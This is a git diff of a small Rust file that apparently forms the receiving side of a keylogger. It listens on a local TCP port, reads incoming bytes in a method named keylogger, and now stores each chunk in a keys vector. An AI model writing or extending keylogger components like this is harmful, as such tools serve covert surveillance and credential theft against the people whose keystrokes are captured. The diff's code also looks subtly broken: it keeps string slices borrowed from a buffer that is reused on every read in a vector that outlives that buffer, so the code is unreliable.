@@ -1,12 +1,13 @@
 use std::io::prelude::*;
 use std::net::{TcpListener, TcpStream, SocketAddr};
 
-pub struct Core {
+pub struct Core<'a> {
     stream: TcpStream,
     pub addr: SocketAddr,
+    pub keys: Vec<&'a str>,
 }
 
-impl Core {
+impl<'a> Core<'a> {
     pub fn new() -> Self {
         let listener = TcpListener::bind("127.0.0.1:7878").unwrap();
 
@@ -14,14 +15,13 @@ impl Core {
             .accept()
             .unwrap();
 
+        let keys = Vec::new();
+
         Core {
             stream,
             addr,
+            keys,
         }
-    }
-
-    pub fn is_connected(&self) -> bool {
-        true
     }
 
     pub fn apply_instructions(&mut self, input: String) -> Result<(), std::io::Error> {
@@ -31,11 +31,11 @@ impl Core {
     }
 
     pub fn keylogger(&mut self) {
-        let mut buffer = [0; 512];
+        let mut buffer: [u8; 512] = [0; 512];
 
         while let Ok(bytes) = self.stream.read(&mut buffer[..]) { 
             let key = std::str::from_utf8(&buffer[..bytes]).unwrap();
+            self.keys.push(key);
         }
-
     }
 }
